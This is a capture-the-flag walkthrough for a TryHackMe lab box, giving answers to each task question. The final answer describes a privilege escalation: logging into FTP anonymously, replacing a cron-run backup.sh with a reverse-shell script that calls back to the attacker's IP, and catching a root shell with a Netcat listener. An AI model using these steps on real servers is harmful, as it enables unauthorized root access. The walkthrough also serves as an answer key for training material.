# Anyone can be Santa!

Before we begin, we're going to need to deploy two Instances:

	1. The THM AttackBox by pressing the "Start AttackBox" button at the top-right of the page.
	2. The vulnerable Instance attached to this task by pressing the "Deploy" button at the top-right of this task/day.

- Name the directory on the FTP server that has data accessible by the "anonymous" user

	- `ftp <TARGET_IP>` and enter `anonymous` 
	- `public`

- What script gets executed within this directory?

	- `backup.sh`

- What movie did Santa have on his Christmas shopping list?

	- (ftp) `get shoppinglist.txt`
	- `The polar express`

- Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!
Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have setup a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.

	- Insert your IP address in `backup.sh` where is the lable.
	- (ftp) `put backup.sh`
	- On your machine `nc -lvnp 4444`
	- You should get a root shell in a minute.
	- `cat /root/flag.txt`
	- `THM{****_***_***_**_*****}`





